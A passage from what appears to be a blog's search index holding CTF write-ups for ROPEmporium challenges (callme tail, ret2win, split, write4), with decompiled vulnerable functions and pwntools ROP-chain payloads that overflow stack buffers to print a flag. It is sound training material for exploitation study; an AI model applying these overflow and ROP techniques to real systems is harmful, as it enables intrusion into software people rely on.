class="line">args = deadbeef + cafebabe + d00df00d </span><br><span class="line"></span><br><span class="line">payload = offset + ropgadget + args + callme_one</span><br><span class="line">payload += ropgadget + args + callme_two  </span><br><span class="line">payload += ropgadget + args + callme_three</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>And again, this is only the payload part, and not the whole script.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium: ret2win 64-bit</title>
      <link href="/2022/04/12/ret2win/"/>
      <url>/2022/04/12/ret2win/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-of-ret2win-from-ROPEmporium"><a href="#Writeup-of-ret2win-from-ROPEmporium" class="headerlink" title="Writeup of ret2win from ROPEmporium"></a>Writeup of ret2win from ROPEmporium</h2><p>This challenge is the first challenge from ROPEmporium.com</p><p>Starting of I checked the file and what securities it had enabled. It was ofcourse a 64-bit file, as I chose the 64-bit and it had no PIE or canary. Great!</p><p>Next up I used <code>objdump -d ret2win</code> to get a basic view of the functions in the binary.<br>Two functions caught my attention. The first was called <code>pwnme</code> and the second was called <code>ret2win</code>.<br>My guess was that I had to make the <code>pwnme</code> function return to the <code>ret2win</code> function. </p><p>By disassembling the binary in Ida Pro I got a better view of the different functions.</p><p>The <code>ret2win</code> function looked like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>The function prints the well done string and then it cats our flag. That’s exactly what we want.</p><p>Now let’s take a look at the <code>pwnme</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>At the start the buffer for our read input is set to 32 bytes. But when looking at the read function, we see that it reads 0x38 bytes, which is 56 bytes in decimal. We have an overflow of 24 bytes which is more than enough to return to the <code>ret2win</code> function.</p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>To overflow the return pointer we have to pass 32 bytes worth of junk, then 8 bytes to fill the basepointer and at last the address to the <code>ret2win</code> function. By using <code>objdump -d ret2win | grep ret2win</code> we get the address of the <code>ret2win</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000400756</span> &lt;ret2win&gt;:</span><br></pre></td></tr></table></figure><p>Using the pwntools library we can craft our payload, which ended up looking like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">40</span></span><br><span class="line">ret2win = p64(<span class="number">0x0000000000400756</span>)</span><br><span class="line">ret = p64(<span class="number">0x000000000040053e</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, padding + ret + ret2win)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>Keep in mind that this isn’t the full solve script, but only the payload part of the script.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium: split 64-bit</title>
      <link href="/2022/04/12/split/"/>
      <url>/2022/04/12/split/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-of-split-from-ROPEmporium"><a href="#Writeup-of-split-from-ROPEmporium" class="headerlink" title="Writeup of split from ROPEmporium"></a>Writeup of split from ROPEmporium</h2><p>This challenge is the second challenge from ROPEmporium.com</p><p>I started of by checking the file and its securities. Again, it’s a 64-bit file and the only security enabled is NX, which means we can’t execute opcodes from the stack.</p><p>I then used <code>objdump -d split</code> to get a better understanding of the binary and its functions. Again we have a <code>pwnme</code> function and we have another function called <code>usefulFunction</code>, which obviously will be used for something later on. In the challenge description it says that we still have the <code>/bin/cat flag.txt</code> string. By using <code>rabin2 -z split</code> we can find the strings and their location. Indeed we see that the <code>/bin/cat flag.txt</code> string is still here and it’s located in the .rodata section of the file. </p><p>I then disassembled the binary in Ida Pro to get further information on the functions.</p><p>The <code>usefulFunction</code> looked like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We see that it has a system call with the argument <code>/bin/ls</code>. This is no good when we want to read the flag. But as we saw earlier, we still have the <code>/bin/cat flag.txt</code> string in the binary. </p><p>Okay, now let’s take a look at the <code>pwnme</code> function:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can see that the buffer for our input is set to 32 bytes in the start of the function. When read is called it takes an input and it read 0x60 bytes, which is 96 bytes in decimal. So we have a buffer overflow of 64 bytes. Great.</p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>So we have a buffer overflow in the <code>pwnme</code> function, and we have a system call in the usefull function. The only problem is that the system call has the <code>/bin/ls</code> argument, but we want <code>/bin/cat flag.txt</code>. How do we achieve this?</p><p>Well, we have to call the system call with the argument <code>/bin/cat flag.txt</code>. We can do this by passing our 32 junk bytes, 8 bytes to fill the base pointer, and then it gets interesting. When calling a function in x86_64 architechture, we have a specific calling convention. The first argument of a function is located in the RDI register, the second is located in the RSI, third in RDX, fourth in RCX, fifth in R8, and sixth in R9. All further arguments will come from the stack. The reasoning behind having the first six arguments stored in the registers is because they are waaay faster than the stack. </p><p>So we have to reach our overflow, use a rop gadget to pop the RDI register, as it’s the register for the first argument, then pass the address to our <code>/bin/cat flag.txt</code> string, and at last the address of the system call. This should provide an easy flag. Let’s do it.</p><p>Using the pwntools library for python we can craft our payload, which ended up looking like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;i&quot;</span>*<span class="number">40</span></span><br><span class="line">bincat = p64(<span class="number">0x0000000000601060</span>)</span><br><span class="line">system = p64(<span class="number">0x000000000040074b</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x00000000004007c3</span>)</span><br><span class="line"></span><br><span class="line">payload = offset + pop_rdi + bincat + system</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>And as it should this payload gets us the flag.</p><p>Remember this is only the payload part of the pwntools script.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium: write4 64-bit</title>
      <link href="/2022/04/12/write4/"/>
      <url>/2022/04/12/write4/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup-for-write4-from-ROPEmporium"><a href="#Writeup-for-write4-from-ROPEmporium" class="headerlink" title="Writeup for write4 from ROPEmporium"></a>Writeup for write4 from ROPEmporium</h2><p>This challenge is the fourth challenge from ROPEmporium.com</p><p>In this challenge, the author tells us that we do not have a <code>/bin/cat flag.txt</code> string in our file. What are we supposed to do then? We start by checking the securities again. NX enabled is still the only security we have. By using the command <code>objdump -d write4</code> we can take a look at the functions of the binary. We have a <code>usefulGadgets</code> function, a <code>usefulFunction</code>, and our <code>pwnme</code> function. </p><p>Let’s disassemble the binary in Ida Pro to get a closer look on some of the functions.</p><p>The <code>pwnme</code> function looks a bit weird in this one:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line">__int64 __fastcall <span class="title function_">pwnme</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> pwnme(a1, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the author says in the challenge description, the function is moved into a separate library. But it says that this has no effect on our stack smashing and rop chain. That’s good to know.</p><p>The <code>usefulFunction</code> looks like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So as we can see, it prints a file, with the argument <code>&quot;nonexistent&quot;</code>. We want to use this function to print <code>&quot;flag.txt&quot;</code>. </p><p>When looking at the <code>usefulGadgets</code> function it’s again best to look at the assembly code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400628 &lt;usefulGadgets&gt;:</span><br><span class="line">   0x0000000000400628 &lt;+0&gt;:mov    QWORD PTR [r14],r15</span><br><span class="line">   0x000000000040062b &lt;+3&gt;:ret    </span><br></pre></td></tr></table></figure><p>This is interesting. We can use this gadget to move something from the R15 register into the address that the R14 register points to. Okay, so we have to find an address somewhere in the binary file that we can overwrite with <code>&quot;flag.txt&quot;</code> without messing up the whole binary. If we want to do this, we will also have to find a gadget that pops something into the R14 and R15 registers. Luckily we have one at this address:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400690 : pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>The author tells us to use rabin2 or readelf to analyze the file and its sections. By using <code>readelf -S write4</code> we can get a look at the section headers. The .data section is usually okay to overwrite, and we see that we have 10 bytes available at <code>0x0000000000601028</code>. This would be a nice place to store our <code>&quot;flag.txt&quot;</code> string. </p><p>When using the <code>usefulFunction</code> with an argument, we also have to pop something into the RDI register, as it is the place for the first argument of a function. We have a gadget for this: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400693 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>Okay, we’re about to be ready for doing the exploit now.</p><h3 id="Exploiting-the-binary"><a href="#Exploiting-the-binary" class="headerlink" title="Exploiting the binary"></a>Exploiting the binary</h3><p>By using gdb to find how many bytes we need to pass to the binary to fill the return pointer, we find out that it’s 40 bytes just like the previous challenges.</p><p>So we have to pass 40 bytes of junk, then we have to pop the address of the .data section into R14, and we have to pop our <code>&quot;flag.txt&quot;</code> string into the R15 register. Then we have to use the <code>usefulGadgets</code> which moves the contents of the R15 register into the place where the R14 address point to. </p><p>Let’s clear things up. For now we have an R14 register which points to an address in the .data section of the binary. This address stores a string, which is <code>&quot;flag.txt&quot;</code>. Now we want to call the <code>usefulFunction</code>, with the first argument as the .data section address that now contains <code>&quot;flag.txt&quot;</code>. To do this we pop the .data section address into the RDI register with the pop rdi gadget. And at last we call the <code>usefulFunction</code> to print the flag. Cool.</p><p>Let’s craft the payload with the pwntools library for python.<br>It will look something like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;i&quot;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Addresses</span></span><br><span class="line">printFile = p64(<span class="number">0x0000000000400620</span>)</span><br><span class="line">data_section = p64(<span class="number">0x0000000000601028</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Gadgets</span></span><br><span class="line">move_gadget = p64(<span class="number">0x0000000000400628</span>)</span><br><span class="line">pop_r14_r15 = p64(<span class="number">0x0000000000400690</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x0000000000400693</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = padding + pop_r14_r15 + data_section + flat(<span class="string">&quot;flag.txt&quot;</span>) + move_gadget + pop_rdi + data_section + printFile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>Remember that this is only the payload of the script, not the whole script.</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
